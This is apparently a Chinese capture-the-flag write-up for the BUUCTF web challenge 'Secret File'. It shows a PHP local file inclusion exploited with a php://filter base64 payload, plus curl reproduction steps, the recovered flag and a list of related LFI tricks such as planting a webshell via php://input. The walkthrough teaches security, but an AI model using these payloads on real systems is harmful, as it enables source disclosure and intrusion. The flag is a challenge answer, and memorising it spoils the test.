---
title: "[极客大挑战 2019]Secret File"
platform: BUUCTF
category: Web
difficulty: 简单
tags: [lfi, php-filter, information-leakage, source-disclosure]
vulnerability: PHP本地文件包含(LFI)通过php://filter伪协议读取源码
solved: true
flag: "flag{6092fc02-acca-4792-853f-b20787774635}"
---

# [极客大挑战 2019]Secret File

## 题目概述
一个典型的文件泄露+本地文件包含(LFI)题目。页面通过多层跳转和隐藏链接逐步引导，最终到达一个存在文件包含漏洞的PHP页面，利用 `php://filter` 伪协议绕过过滤读取 flag.php 源码。

## 信息收集

1. **首页** `index.html`：隐藏链接 `<a href="./Archive_room.php">` 颜色与背景相同（黑色），通过查看源码发现。
2. **Archive_room.php**：跳转到 `action.php`。
3. **action.php**：302 重定向到 `end.php`，但响应体 HTML 注释中泄露了关键路径：
   ```html
   <!-- secr3t.php -->
   ```
4. **secr3t.php**：`highlight_file(__FILE__)` 直接展示了源码，发现文件包含漏洞。

## 漏洞分析

**漏洞类型**：PHP 本地文件包含（LFI）

**源码**：
```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
    //flag放在了flag.php里
?>
```

**过滤规则**：
- `../` — 禁止目录穿越
- `tp` — 过滤 `tp` 字符串（意图阻止 `php://` 协议？但 `php://filter` 不含 `tp`）
- `input` — 过滤 `php://input`
- `data` — 过滤 `data://` 协议

**绕过分析**：`php://filter/read=convert.base64-encode/resource=flag.php` 中不包含 `../`、`tp`、`input`、`data` 中的任何一个，可直接绕过。

## 利用过程

### Payload
```
GET /secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
```

### 响应（base64 编码部分）
```
PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4K...
```

### 解码后（flag.php 源码）
```php
<?php
    echo "我就在这里";
    $flag = 'flag{6092fc02-acca-4792-853f-b20787774635}';
    $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
?>
```

### Flag
```
flag{6092fc02-acca-4792-853f-b20787774635}
```

## 复现步骤

```bash
# 1. 访问首页，查看源码找到隐藏链接
curl -s http://TARGET:81/

# 2. 跟踪跳转链，查看 action.php 源码注释
curl -s http://TARGET:81/action.php

# 3. 访问 secr3t.php，查看源码发现文件包含
curl -s http://TARGET:81/secr3t.php

# 4. 利用 php://filter 读取 flag.php（base64 编码绕过输出）
curl -s "http://TARGET:81/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php"

# 5. 解码 base64 得到 flag
echo "PCFET0NU..." | base64 -d
```

## 技术总结

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|-------|
| LFI（本地文件包含） | `secr3t.php?file=` 参数 | `php://filter/read=convert.base64-encode/resource=flag.php` | php://filter 伪协议绕过关键词过滤 |

## 知识总结

1. **信息收集要彻底**：每一步跳转都要查看响应头和响应体，302 重定向的 body 中可能隐藏注释信息。页面源码中的隐藏链接（颜色与背景一致、字体大小为0等）也是常见考点。
2. **php://filter 是 LFI 利用利器**：当 `include($file)` 可控时，用 `php://filter/read=convert.base64-encode/resource=目标文件` 可以读取任意 PHP 文件源码（避免 PHP 被直接执行）。
3. **过滤绕过思路**：本题过滤了 `tp`、`input`、`data`、`../`，但 `php://filter` 不含这些关键词，属于出题人故意留下的绕过口子。实际做题时需逐字检查过滤规则。
4. **同类题型套路**：文件包含题常见套路 — `php://filter` 读源码、`php://input` + POST 写马、`data://` 协议执行命令、日志文件包含等。
